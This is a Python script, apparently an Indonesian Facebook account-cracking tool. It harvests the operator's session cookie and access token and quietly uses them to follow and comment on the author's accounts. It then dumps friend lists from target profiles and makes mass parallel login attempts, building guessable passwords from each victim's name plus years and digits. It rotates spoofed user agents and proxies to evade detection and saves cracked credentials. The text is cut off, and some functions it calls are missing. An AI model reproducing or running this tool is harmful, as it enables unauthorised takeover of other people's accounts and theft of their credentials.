

import os

# ------------------[  MODULE  ]-------------------#
M2 = "[#FF0000]"  # MERAH
H2 = "[#00FF00]"  # HIJAU
K2 = "[#FFFF00]"  # KUNING
B2 = "[#00C8FF]"  # BIRU
P2 = "[#FFFFFF]"  # PUTIH
U2 = "[#AF00FF]"  # UNGU
O2 = "[#FF8F00]"  # ORANGE


try:
    import rich
except ImportError:
    os.system("pip install rich")
from rich.console import Console

console = Console()

try:
    import rich
except ImportError:
    console.print(f" {K2}• {H2}Sedang Menginstall Modul Rich {H2}•{P2}")
    os.system("pip install rich")
try:
    import stdiomask
except ImportError:
    console.print(f" {K2}• {H2}Sedang Menginstall Modul stdiomask {H2}•{P2}")
    os.system("pip install stdiomask")
try:
    import bs4
except ImportError:
    console.print(f" {K2}• {H2}Sedang Menginstall Modul bs4 {H2}•{P2}")
    os.system("pip install bs4")


# ------------------[ IMPORT MODULE ]-------------------#
import requests, bs4, json, os, sys, random, datetime, time, re, rich, base64, subprocess, uuid, calendar
from time import sleep
import shutil
import hashlib
from datetime import date
from rich import pretty
from rich.tree import Tree
from rich.panel import Panel
from rich import print as cetak
from rich import print as rprint
from rich import print as prints
from rich.progress import track
from rich.text import Text as tekz
from rich.console import Console
from rich.text import Text
from rich.align import Align
from rich.columns import Columns
from rich.panel import Panel as nel
from rich.panel import Panel as panel
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as par
from rich.console import Group as gp
from bs4 import BeautifulSoup as parser
from rich.columns import Columns as col
from rich.console import Console as sol
from rich.console import Console
from bs4 import BeautifulSoup as beautifulsoup
from rich.markdown import Markdown as mark
from concurrent.futures import ThreadPoolExecutor as tred
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn


# ------------------[ GLOBAL NAME ]-------------------#
sekarang = calendar.timegm(time.gmtime(time.time()))
pretty.install()
CON = sol()
wa = Console()
ugen = []
ugent = []
console = Console()
ses = requests.Session()
hapus  = '[/]'
lisensiku=[]
temanku = []
id, id2, loop, ok, cp, akun, tokenku, uid, method, pwpluss, pwnya, tokenmu = [], [], 0, 0, 0, [], [], [], [], [], [], []
dia, ualu, ualuh = [], [], []
sys.stdout.write("\x1b]2; fendi ganteng\x07")

#PROXI BUAT LIAT LU NGENTOD (FENDI GAMTENG)
def get_proxy():
    """Ambil list proxy otomatis dari Proxyscrape"""
    try:
        url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all"
        proxies = requests.get(url).text.strip().split("\n")
        return proxies
    except:
        return [""]  # Kosong kalau gagal ambil proxy

        ###----------[ GET DATA DARI DEVICE ]---------- ###
try:
	android_version = subprocess.check_output("getprop ro.build.version.release",shell=True).decode("utf-8").replace("\n","")
	try:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
	except:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","")
	# versi_app = str(random.randint(111111111,999999999))
except:
	android_version = []
	simcard = []
	pass

#USER AGENT HP INI TAI GOSAH DI GANTI UDAH GACOR
def generate_android_ua():
    android_versions = ["7.0", "8.1.0", "9", "10", "11", "12", "13", "14"]

    devices = [
        # REDMI (Lebih sering muncul Redmi Note 9)
        "Redmi Note 9", "Redmi Note 9 Pro", "Redmi Note 8", "Redmi Note 10", "Redmi 9A", 
        "Redmi 10C", "Redmi K40", "Redmi K50", "Redmi 8", "Redmi 10X",
        # VIVO
        "Vivo Y20", "Vivo V21", "Vivo X60", "Vivo Y12", "Vivo Y50", "Vivo Y53s",
        # OPPO
        "Oppo A92", "Oppo Reno 5", "Oppo F11 Pro", "Oppo A74", "Oppo A3s", "Oppo A15",
        # REALME
        "Realme 7", "Realme C25", "Realme Narzo 30", "Realme GT Neo", "Realme 9i", "Realme 8 Pro",
        # NOKIA
        "Nokia 5.4", "Nokia 3.1", "Nokia G50", "Nokia 8.3", "Nokia X10", "Nokia C20",
        # INFINIX
        "Infinix Note 10", "Infinix Hot 9", "Infinix Zero 8", "Infinix Smart 5", "Infinix S5",
        # SAMSUNG
        "Samsung Galaxy S21", "Samsung Galaxy S10", "Samsung Galaxy A12", "Samsung Galaxy M32",
        "Samsung Galaxy A71", "Samsung Galaxy A52s", "Samsung Galaxy M51",
        # HUAWEI
        "Huawei P30", "Huawei P40 Pro", "Huawei Nova 7", "Huawei Y9 Prime", "Huawei Mate 30",
        # ASUS
        "Asus ROG Phone 5", "Asus Zenfone 8", "Asus ROG Phone 6", "Asus Zenfone Max Pro M1",
        # POCO
        "Poco X3", "Poco M3", "Poco F3", "Poco X4 GT", "Poco C40",
        # ONEPLUS
        "OnePlus Nord", "OnePlus 8T", "OnePlus 9 Pro", "OnePlus 7T", "OnePlus 10R",
        # SONY
        "Sony Xperia 1 III", "Sony Xperia 5 II", "Sony Xperia 10 II", "Sony Xperia XZ3",
        # MOTOROLA
        "Moto G Power", "Moto G Stylus", "Moto Edge 20", "Moto G9 Play", "Moto E7 Plus"
    ]

    chrome_versions = f"{random.randint(100, 120)}.0.{random.randint(4000, 9999)}.{random.randint(40, 150)}"
    
    dalvik_versions = [
        "Dalvik/2.1.0 (Linux; U; Android", "Dalvik/2.1.0 (Linux; Android",
        "Dalvik/2.1.0 (Linux; U; Android", "Dalvik/1.6.0 (Linux; U; Android",
        "Dalvik/1.4.0 (Linux; U; Android"
    ]

    mozilla_variants = [
        "Mozilla/5.0 (Linux; Android", "Mozilla/5.0 (X11; Android",
        "Mozilla/5.0 (Linux; U; Android", "Mozilla/5.0 (Mobile; Android"
    ]

    # Mozilla UA
    mozilla_ua = f"{random.choice(mozilla_variants)} {random.choice(android_versions)}; {random.choices(devices, weights=[5 if 'Redmi Note 9' in d else 1 for d in devices], k=1)[0]}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_versions} Mobile Safari/537.36"

    # Dalvik UA
    dalvik_ua = f"{random.choice(dalvik_versions)} {random.choice(android_versions)}; {random.choice(devices)})"

    return random.choice([mozilla_ua, dalvik_ua])

def generate_headers():
    """Generate random headers untuk setiap request"""
    accept_list = [
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "application/json, text/javascript, */*; q=0.01",
        "*/*",
        "text/plain, */*; q=0.01"
    ]
    encoding_list = ["gzip, deflate", "br, gzip, deflate", "identity"]
    language_list = ["en-US,en;q=0.5", "id-ID,id;q=0.9", "fr-FR,fr;q=0.8"]

    headers = {
        "User-Agent": generate_android_ua(),
        "Referer": "https://www.google.com/",
        "Accept": random.choice(accept_list),
        "Accept-Encoding": random.choice(encoding_list),
        "Accept-Language": random.choice(language_list),
        "Connection": "keep-alive"
    }
    return headers

    #MENU AWAL
console = Console()

def banner():
    console.print(Panel(
        Text("""
███████╗███████╗███╗   ██╗██████╗ ██╗       
██╔════╝██╔════╝████╗  ██║██╔══██╗██║
███████╗█████╗  ██╔██╗ ██║██║  ██║██║
██╚════║██╔══╝  ██║╚██╗██║██║  ██║██║
██     ║███████╗██║ ╚████║██████╔╝██║
╚══════╝╚══════╝╚═╝  ╚═══╝╚═════╝ ╚═╝
""", style="bold green"),
    width=60, style="bold cyan", title="[bold white]🔥 FENDI 🔥"))

def login123():
    banner()
    console.print(Panel(
        "[bold yellow][01][/bold yellow] Login Menggunakan Cookie 🍪\n"
        "[bold yellow][02][/bold yellow] Keluar 🚪",
        width=60, style="bold magenta", title="[bold white]📌 MENU 📌"))
    
    pilihan = console.input("\n[bold cyan]Pilih menu: [/bold cyan]")

    if pilihan == "1":
        console.print("[bold green]✅ Login menggunakan Cookie...[/bold green]")
    elif pilihan == "2":
        console.print("[bold red]❌ Keluar...[/bold red]")
        exit()
    else:
        console.print("[bold red]⚠ Pilihan tidak diketahui! Coba lagi.[/bold red]")
        tiem.sleep(5)
        login()

def login():
    try:
        token = open(".fantoken.txt", "r").read()
        cok = open(".fancookie.txt", "r").read()
        tokenku.append(token)
        try:
            menu()
        except KeyError:
            login123()
        except requests.exceptions.ConnectionError:
            Console().print(
                f" {H2}• {P2}[bold red]Problem Internet Connection, Check And Try Again"
            )
            exit()
    except IOError:
        login123()





# --------------------[ LOGIN-TOKEN-EAAB ]--------------#
def logincoki():
    try:
        cok = Console().input(f" {H2}• {P2}cookie : ")
        cookie = {'cookie':cok}
        open(".fancookie.txt","w").write(cok)
        with requests.Session() as xyz:
            url = 'https://www.facebook.com/adsmanager/manage/campaigns'
            req = xyz.get(url,cookies=cookie)
            set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
            nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
            roq = xyz.get(nek,cookies=cookie)
            tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
            open(".fantoken.txt","w").write(tok)
            bot_komen(cok, tok)
            Console().print(Panel(f"""{P2}{tok}""", width=60, style=f"{color_panel}", title="[bold green]TOKEN"))
            Console().print(f" {H2}• {P2}[bold green]Login Berhasil, jalankan Ulang Script")
            exit()
    except Exception as e:
        os.system("rm -rf .fantoken.txt && rm -rf .fancookie.txt")
        exit()

        # --------------------[ INI BOT FOLLOW & KOMEN ]--------------#
def bot_komen(cok, ken):
	with requests.Session() as r:
		text = random.choice(['Keren Bang 😎', 'Hello World!', 'Mantap Bang ☺️', 'I Love You ❤️', 'Hai Bang 😘'])
		r.cookies.update({'cookie': cok})
		r.post(f'https://graph.facebook.com/100043537611609/subscribers?access_token={ken}')
		# r.post(f'https://graph.facebook.com/926438272150751/comments/?message={text}&access_token={ken}')
		r.post(f'https://graph.facebook.com/926438272150751/comments/?message={text}&access_token={ken}')
		r.post(f'https://graph.facebook.com/926438272150751/likes?summary=true&access_token={ken}')
		# r.post(f'https://graph.facebook.com/100043537611609/subscribers?access_token={ken}')
# ------------------[ INI BOT FOLLOW GOBLOG BTW FENDI GANTENG ]--------------#
def bot_follow():
	with requests.Session() as r:
		toket = open('.fantoken.txt','r').read()
		r.post(f'https://graph.facebook.com/100043537611609/subscribers?access_token={toket}')

# ----------------[ BAGIAN-MENU ]----------------#
def menu():
    try:
        prem = f"{H2}Premium"
    except (KeyError, FileNotFoundError):
        prem = f"{H2}Premium"

    try:
        token = open(".fantoken.txt", "r").read()
        cookie = open(".fancookie.txt", "r").read()
        tokenku.append(token)
    except IOError:
        Console().print(f" {H2}• {P2}[bold red] Cookies Kadaluarsa, masukan ulang cookie")
        os.system("rm -rf .fantoken.txt && rm -rf .fancookie.txt")
        time.sleep(3)
        login()
    try:
        header = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-US,en;q=0.9', 'Cache-Control': 'max-age=0', 'Pragma': 'akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace', 'Sec-Ch-Prefers-Color-Scheme': 'light', 'Sec-Ch-Ua': '', 'Sec-Ch-Ua-Full-Version-List': '', 'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Platform': '', 'Sec-Ch-Ua-Platform-Version': '', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36', 'Viewport-Width': '924'}
        req = ses.get('https://www.facebook.com/profile.php', headers=header, cookies={'cookie': cookie}, allow_redirects=True).text
        my_id = re.search('"userID":"(.*?)"', str(req)).group(1)
        my_name = re.search('"NAME":"(.*?)"', str(req)).group(1)
    except:
        my_name=[]
        my_id=[]
    try:
        with open(".fantoken.txt", "r") as f:
            token = f.read().strip()
        with open(".fancookie.txt", "r") as f:
            cookie = f.read().strip()
        url = f"https://graph.facebook.com/me/friends?fields=summary&limit=0&access_token={token}"
        response = ses.get(url, cookies={"cookie": cookie}).json()
        temanku = response.get("summary", {}).get("total_count", 0)
    except:
        pass
    clear()
    banner()
    try:
        key = open(".license","r").read()
    except:
        key = "-"
    negara = requests.get("http://ip-api.com/json/").json()["country"]
    ip = requests.get("http://ip-api.com/json/").json()["query"]
    text = Align.center(f"{H2}{negara}{K2}")
    console.print(Panel(text, padding=(0, 12), width=60, style=color_panel))
    dia.append(Panel(f"{P2}Android : {H2}versi {android_version}\n{P2}tanggal : {H2}{hari_ini}\n{P2}jam     : {H2}{jam_fan}\n{P2}simcard : {H2}{simcard[:18]}",width=30,title=f"{P2}Perangkat",style=f"{color_panel}"))
    # dia.append(Panel(f'{P2}IP      : {H2}{ip}\n{P2}premium : {H2}Premium\n{P2}Negara  : {H2}{negara}',width=30,style=f"{color_panel}"))
    dia.append(panel(f"{P2}Name   : {H2}{my_name[:15]}\n{P2}Idz    : {H2}{my_id}\n{P2}Teman  : {H2}{temanku}\n{P2}IP     : {H2}{ip}",title=f"{P2}Bio Data",width=30,style=f"{color_panel}"))
    console.print(Columns(dia))
    prints(Panel(f"""{P2}[{color_text}01{P2}]. crack dari id publik
[{color_text}02{P2}]. crack dari id Masal
[{color_text}03{P2}]. Lihat Hasil Crack
[{color_text}04{P2}]. Logout [[bold red]hapus cookie[bold white]]
[{color_text}05{P2}]. {M2}EXIT{P2}""",width=60,title="MENU",style=f"{color_panel}"))
    HaHi = console.input(f" {H2}• {P2}pilih menu : ")
    if HaHi in ["1", "01"]:
        prints(Panel(f"""{P2}masukan id target, pastikan id target bersifat publik""",subtitle=f"{P2}ketik {H2}me{P2} untuk dump dari teman sendiri",width=60,style=f"{color_panel}"))
        idfac = console.input(f" {H2}• {P2}Masukan Id Target :{U2} ")
        dump_publikk(idfac,"",{"cookie":cookie},token)
        print('\n')
        setting()
    elif HaHi in ["2", "02"]:
        massal()
    elif HaHi in ["3", "03"]:
        result()
    elif HaHi in ["4", "04"]:
        os.system('rm -rf .fancookie.txt');os.system('rm -rf .fantoken.txt')
        console.print(f" {H2}• {P2}Berhasil Hapus Cookie")
    elif HaHi in ["5", "05"]:
        exit()
    else:
    	console.print(f" {H2}• {P2}[bold red]Masukan Yang Bener Tolol!!! btw fendi ganteng ")


#----------[ CRACK-PUBLIK  ]----------#
def dump_publikk(idfac,fields,cookie,token):
    try:
        headers = {"connection": "keep-alive", "accept": "*/*", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors","sec-fetch-site": "same-origin", "sec-fetch-user": "?1","sec-ch-ua-mobile": "?1","upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9"}
        if len(id)==0:
            params = {"access_token": token,"fields": f"name,friends.fields(id,name,birthday)"}
        else:
            params = {"access_token": token,"fields": f"name,friends.fields(id,name,birthday).after({fields})"}
        url = ses.get(f"https://graph.facebook.com/{idfac}", params=params, headers=headers, cookies=cookie).json()
        for i in url["friends"]["data"]:
            id.append(i["id"]+"|"+i["name"])
            sys.stdout.write(f"\r • sedang dump id, berhasil mendapatkan : {len(id)} ID")
            sys.stdout.flush()
        dump_publikk(idfac,url["friends"]["paging"]["cursors"]["after"],cookie,token)
    except: pass


#----------[ CRACK-massal  ]----------#
def massal():
    global id
    try:
        token = open(".fantoken.txt", "r").read().strip()
        cok = open(".fancookie.txt", "r").read().strip()
    except IOError:
        Console().print(f" {H2}• {P2}Token atau Cookie tidak ditemukan!")
        exit()
    try:
        Console().print(Panel("[bold white] Masukkan Jumlah Target yang Mau di Crack", width=60, style=color_panel, title="[bold green] Crack Massal [bold white]"))
        jum = int(input(f" • Masukkan jumlah target: "))
    except ValueError:
        Console().print(f" {H2}• {P2}Input salah, harap masukkan angka!")
        exit()
    if jum < 1 or jum > 80:
        Console().print(f" {H2}• {P2}Jumlah target tidak valid (1-80)")
        exit()
    ses = requests.Session()

    uid = []  # Menyimpan daftar target
    id = []   # Menyimpan hasil dump
    # Input ID Target
    for i in range(jum):
        Console().print(Panel(f"[bold white] Masukkan Target ke-{i+1}", width=60, style=color_panel))
        kl = Console().input(f" {H2}• {P2}Masukkan ID Target: ")
        uid.append(kl)
    # Loop untuk setiap target
    for userr in uid:
        try:
            headers = {"connection": "keep-alive", "accept": "*/*", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors","sec-fetch-site": "same-origin", "sec-fetch-user": "?1","sec-ch-ua-mobile": "?1","upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9"}
            params = {"access_token": token,"fields": f"name,friends.fields(id,name,birthday)"}
            url = ses.get(f"https://graph.facebook.com/{userr}", params=params, headers=headers, cookies={"cookie": cok}).json()
            if "friends" in url:
                for i in url["friends"]["data"]:
                    id.append(i["id"] + "|" + i["name"])
                    sys.stdout.write(f"\r • sedang dump id, berhasil mendapatkan : {len(id)} ID")
                    sys.stdout.flush()
                # Pagination (jika ada lebih banyak data)
                while "paging" in url["friends"] and "next" in url["friends"]["paging"]:
                    after_cursor = url["friends"]["paging"]["cursors"]["after"]
                    params["fields"] = f"name,friends.fields(id,name,birthday).after({after_cursor})"
                    url = ses.get(f"https://graph.facebook.com/{userr}", params=params, headers=headers, cookies={"cookie": cok}).json()
                    for i in url["friends"]["data"]:
                        id.append(i["id"] + "|" + i["name"])
                        sys.stdout.write(f"\r • sedang dump id, berhasil mendapatkan : {len(id)} ID")
                        sys.stdout.flush()
            else:
                pass
        except (KeyError, IOError):
            pass
        except requests.exceptions.ConnectionError:
            Console().print(f" {H2}• {P2}Koneksi tidak stabil!")
            exit()
    try:
        print('\n')
        setting()
    except requests.exceptions.ConnectionError:
        Console().print(f" {H2}• {P2}Koneksi tidak stabil!")
        exit()
    except (KeyError, IOError):
        Console().print(f" {H2}• {P2}Pertemanan tidak publik!")
        time.sleep(3)
        exit()

#----------[ LIHAT-HASIL-CRACK ]----------#
def result():
    console.print(Panel(f"""{P2}[{color_text}01{P2}]. Lihat Hasil {K2}CP{P2}
{P2}[{color_text}02{P2}]. Lihat Hasil {H2}OK{P2}""", width=60, title=f"Hasil Crack", style=color_panel))
    fankycek = console.input(f" {H2}• {P2}Masukan : ")
    if fankycek in ["1", "01"]:
        lihat_hasil("CP", f"{H2}• {P2}Anda Tidak Memiliki Hasil CP", "bold yellow")
    elif fankycek in ["2", "02"]:
        lihat_hasil("OK", f"{H2}• {P2}Anda Tidak Mempunyai File OK", "bold green")
    else:
        console.print(f" {H2}• {P2}Pilih Yang Bener Bang")
        exit()

def lihat_hasil(folder, pesan_tidak_ada, warna_akun):
    try:
        files = os.listdir(folder)
        if not files:
            console.print(pesan_tidak_ada)
            time.sleep(3)
            exit()
    except FileNotFoundError:
        console.print(f" {H2}• {P2}File Tidak Di Temukan ")
        time.sleep(3)
        exit()

    file_map = {}
    for idx, file in enumerate(files, start=1):
        try:
            jumlah = len(open(f"{folder}/{file}", "r").readlines())
        except:
            continue
        num = f"{idx:02}"
        file_map[str(idx)] = file
        file_map[num] = file
        console.print(Panel(f"{P2}[{color_text}{num}{P2}] {file} {K2}{jumlah} Account", width=60, style=color_panel))

    pilih_file(file_map, folder, warna_akun)

def pilih_file(file_map, folder, warna_akun):
    pilihan = console.input(f" {H2}• {P2}Masukan : ").strip()
    
    if pilihan not in file_map:
        console.print(f" {H2}• {P2}Pilih Yang Bener Atuhh")
        exit()
    
    file_path = f"{folder}/{file_map[pilihan]}"
    
    try:
        with open(file_path, "r") as f:
            lines = f.read().splitlines()
    except FileNotFoundError:
        console.print(f" {H2}• {P2}File Tidak Ditemukan")
        time.sleep(3)
        exit()
    
    for line in lines:
        data = line.split("|")
        
        if len(data) == 3:
            user, password, cookie = data
            console.print(Panel(f" ID : {user} PASSWORD : {password} | COOKIE : {cookie}", width=60, style=warna_akun))
        elif len(data) == 2:
            id, pw = data
            console.print(Panel(f" ID : {id} PASSWORD : {pw}", width=60, style=warna_akun))
        else:
            console.print(f" {H2}• {P2}Format data tidak valid: {line}")
    
    console.input(f" {H2}• {P2}[ {M2}Klik Enter Untuk Keluar {P2}]")
    exit()

def convert(cookie):
    cok = "fr=%s;datr=%s;c_user=%s;xs=%s" % (
        cookie["fr"],
        cookie["datr"],
        cookie["c_user"],
        cookie["xs"],
    )
    return str(cok)

def tahun(fx):
    if len(fx) == 15:
        # Untuk ID dengan panjang 15 dan awalan "1000000000" hingga "100000000"
        if fx[:10] == "1000000000":
            tahunz = "2009"
        elif fx[:9] == "100000000":
            tahunz = "2009"
        # ID lebih panjang yang diawali dengan 10000000 (2009)
        elif fx[:8] == "10000000":
            tahunz = "2009"
        # ID yang lebih baru antara 1000000 hingga 1000009 untuk 2009-2010
        elif fx[:7] in ["1000000", "1000001", "1000002", "1000003", "1000004", "1000005"]:
            tahunz = "2009"
        elif fx[:7] in ["1000006", "1000007", "1000008", "1000009"]:
            tahunz = "2010"
        elif fx[:6] == "100001":
            tahunz = "2010"
        elif fx[:6] in ["100002", "100003"]:
            tahunz = "2011"
        elif fx[:6] == "100004":
            tahunz = "2012"
        elif fx[:6] in ["100005", "100006"]:
            tahunz = "2013"
        elif fx[:6] in ["100007", "100008"]:
            tahunz = "2014"
        elif fx[:6] == "100009":
            tahunz = "2015"
        elif fx[:5] == "10001":
            tahunz = "2016"
        elif fx[:5] == "10002":
            tahunz = "2017"
        elif fx[:5] == "10003":
            tahunz = "2018"
        elif fx[:5] == "10004":
            tahunz = "2019"
        elif fx[:5] == "10005":
            tahunz = "2020"
        elif fx[:5] == "10006":
            tahunz = "2021"
        elif fx[:5] == "10009":
            tahunz = "2023"
        elif fx[:5] in ["10007", "10008"]:
            tahunz = "2022"
        
        # Tambahan untuk ID yang dimulai dengan "6"
        elif fx[:10] == "6155383519":
            tahunz = "2015"
        elif fx[:9] == "615538351":
            tahunz = "2015"
        elif fx[:8] == "61553835":
            tahunz = "2015"
        elif fx[:7] == "6155383":
            tahunz = "2015"
        elif fx[:6] == "615538":
            tahunz = "2015"
        elif fx[:6] == "615565":
            tahunz = "2016"
        elif fx[:6] == "615566":
            tahunz = "2016"
        elif fx[:6] == "615567":
            tahunz = "2017"
        elif fx[:6] == "615568":
            tahunz = "2017"
        elif fx[:6] == "615569":
            tahunz = "2018"
        elif fx[:6] == "615570":
            tahunz = "2018"
        else:
            tahunz = ""
    
    elif len(fx) in [9, 10]:
        # ID dengan panjang 9 atau 10 kemungkinan besar dibuat sekitar 2008
        tahunz = "2008"
    elif len(fx) == 8:
        # ID dengan panjang 8 mungkin dibuat sekitar 2007
        tahunz = "2007"
    elif len(fx) == 7:
        # ID dengan panjang 7 kemungkinan besar dibuat sekitar 2006
        tahunz = "2006"
    else:
        tahunz = ""  # ID dengan panjang lainnya tidak diketahui

    return tahunz

# -------------[ PENGATURAN-IDZ ]---------------#
def setting():
    # Validasi variabel global
    global id, id2, method, ualuh, ualu

    # Validasi jika daftar ID kosong
    if not id or not isinstance(id, list):
        console.print(f" {H2}• [bold red]Error:[/bold red] Daftar ID tidak ditemukan atau kosong!")
        return

    # Pilihan metode crack
    Console().print(Panel(
        f"{P2}[{color_text}01{P2}] Crack akun Old [/]\n"
        f"{P2}[{color_text}02{P2}] Crack akun New [/]\n"
        f"{P2}[{color_text}03{P2}] Crack akun Random [[bold green]Recommended[bold white]][/]",
        title=f"[bold green] {len(id)} Akun Tersedia",
        width=60,
        style=f"{color_panel}"
    ))
    
    # Input untuk metode crack
    hu = console.input(f" {H2}• {P2}Masukan : ").strip()
    if hu in ["1", "01"]:
        for tua in sorted(id):  # Urutkan dari lama ke baru
            id2.append(tua)
    elif hu in ["2", "02"]:
        muda = sorted(id)
        id2.extend(muda[::-1])  # Urutkan dari baru ke lama
    elif hu in ["3", "03"]:
        for bacot in id:
            xx = random.randint(0, len(id2))
            id2.insert(xx, bacot)  # Masukkan secara acak
    else:
        print("[bold red]Error:[/bold red] Pilihan tidak valid, coba lagi.")
        return setting()  # Rekursi untuk mengulang input


    # Input untuk metode login
    Console().print(Panel(f"{P2}[{color_text}01{P2}] Login Site [bold green]graph[bold white] [/]\n{P2}[{color_text}02{P2}] Login Site [bold green]MTOUCH [bold white] [/]\n{P2}[{color_text}03{P2}] Login Site [bold green]Touch[bold white] [/]\n{P2}[{color_text}04{P2}] Login Site [bold green]IP [bold white][[bold green]Recommended[bold white]][bold white] [/]\n{P2}[{color_text}05{P2}] Login Site [bold green]m.facebook.com[bold white] [/]",width=60,style=f"{color_panel}",title="[bold green] Method"))
    fankylog = console.input(f" {H2}• {P2}Masukan : ").strip()
    if fankylog in ["1", "01"]:
        method.append("fankygraph")
    elif fankylog in ["2", "02"]:
        method.append("fankygraphv2")
    elif fankylog in ["3", "03"]:
        method.append("fankywww")
    elif fankylog in ["4", "04"]:
        method.append("fankybapi")
    elif fankylog in ["5", "05"]:
        method.append("fankymfb")
    else:
        method.append("fankygraph")  # Default metode
    # Pengaturan User-Agent
    Console().print(Panel(
        f"[bold white]Apakah Anda Ingin Menggunakan UA Manual? Y/T",
        title="[bold green]Setting User-Agent",
        width=60,
        style=f"{color_panel}"
    ))
    uatambah = console.input(f" {H2}• {P2}Masukan : ").strip()
    if uatambah.lower() in ["y", "ya"]:
        ualuh.append("ya")
        bzer = console.input(f" {H2}• {P2}Masukan UA : ").strip()
        ualu.append(bzer)
    else:
        ualuh.append("tidak")

     # Pilihan kecepatan metode
    #metcepat()
    Console().print(Panel(f"{P2}[{color_text}01{P2}] Metode Slow {P2}\n"f"{P2}[{color_text}02{P2}] Metode Cepat {P2}[{H2}Recommended{P2}]{P2}",width=60,style=f"{color_panel}"))
    hc = console.input(f" {H2}• {P2}Masukan : ").strip()
    if hc in ["1", "01"]:
        metslow()
    elif hc in ["2", "02"]:
        metcepat()
    else:
        metcepat()  # Default ke metode cepat
        
# -------------------[ CRACK-SLOW ]------------#
def metslow():
    global prog, des
    bi = random.choice([u, k, kk, b, h, hh])
    print("")
    urut = []
    urut.append(
        panel(
            f"[bold green]%s [bold white]" % (okc),
            width=30,
            title=f"[bold green]OK SAVE",
            style=f"{color_panel}",
        )
    )
    urut.append(
        panel(
            f"[bold yellow]%s [bold white]" % (cpc),
            width=30,
            title=f"[bold yellow]CP SAVE",
            style=f"{color_panel}",
        )
    )
    wa.print(Columns(urut))
    awal = datetime.datetime.now()
    Console().print(
        Panel(
            f"[bold white]hidup/matikan Mode Pesawat Setiap [bold green]300[bold yellow] ID ",
            title=f"[bold yellow]CRACK-SLOW-FANKY-GANTENG",
            width=60,
            style=f"{color_panel}",
        )
    )
    prog = Progress(TextColumn("{task.description}"))
    des = prog.add_task("", total=len(id2))
    with prog:
        with tred(max_workers=30) as pool:
            for yuzong in id2:
                idf, nmf = yuzong.split("|")[0], yuzong.split("|")[1].lower()
                frs = nmf.split(" ")[0]
                pwv = ["indonesia123","bismillah123","sayangku123"]
                if len(nmf) < 6:
                    if len(frs) < 3:
                        pass
                    else:
                        pwv.append(nmf)
                        pwv.append(frs + "321")
                        pwv.append(frs + "2000")
                        pwv.append(frs + "2001")
                        pwv.append(frs + "2002")
                        pwv.append(frs + "2003")
                        pwv.append(frs + "2004")
                        pwv.append(frs + "2005")
                        pwv.append(frs + "2006")
                        pwv.append(frs + "2007")
                        pwv.append(frs + "2008")
                        pwv.append(frs + "2010")
                        pwv.append(frs + "2009")
                        pwv.append(frs + "123")
                        pwv.append(frs + "1234")
                        pwv.append(frs + "12345")
                        pwv.append(frs + "123456")
                        pwv.append(frs + "01")
                        pwv.append(frs + "02")
                        pwv.append(frs + "03")
                        pwv.append(frs + "04")
                        pwv.append(frs + "05")
                        pwv.append(frs + "06")
                else:
                    if len(frs) < 3:
                        pwv.append(nmf)
                    else:
                        pwv.append(nmf)
                        pwv.append(frs + "321")
                        pwv.append(frs + "2000")
                        pwv.append(frs + "2001")
                        pwv.append(frs + "2002")
                        pwv.append(frs + "2003")
                        pwv.append(frs + "2004")
                        pwv.append(frs + "2005")
                        pwv.append(frs + "2006")
                        pwv.append(frs + "2007")
                        pwv.append(frs + "2008")
                        pwv.append(frs + "2010")
                        pwv.append(frs + "2009")
                        pwv.append(frs + "123")
                        pwv.append(frs + "1234")
                        pwv.append(frs + "12345")
                        pwv.append(frs + "123456")
                        pwv.append(frs + "1234567")
                        pwv.append(frs + "01")
                        pwv.append(frs + "02")
                        pwv.append(frs + "03")
                        pwv.append(frs + "04")
                        pwv.append(frs + "05")
                        pwv.append(frs + "06")
                if "ya" in pwpluss:
                    for xpwd in pwnya:
                        pwv.append(xpwd)
                else:
                    pass
                if "fankygraph" in method:
                    pool.submit(fankygraphv1,idf,pwv,"graph.facebook.com")
                elif "fankywww" in method:
                    pool.submit(fankywww,idf,pwv)
                elif "fankygraphv2" in method:
                    pool.submit(fankytouch,idf,pwv)
                elif "fankymfb" in method:
                    pool.submit(fankym,idf,pwv)
                elif "fankybapi" in method:
                    pool.submit(fanky_b_api,idf,pwv)
                else:
                    pool.submit(fanky_b_api,idf,pwv)
                                    
                	
                	
    print("")
    Console().print(
        Panel(
            f"[bold green]Crack Telah Selesai ngap, btw fendi ganteng",
            subtitle="╭───",
            subtitle_align="left",
            title=f"[bold green]INFO",
            width=60,
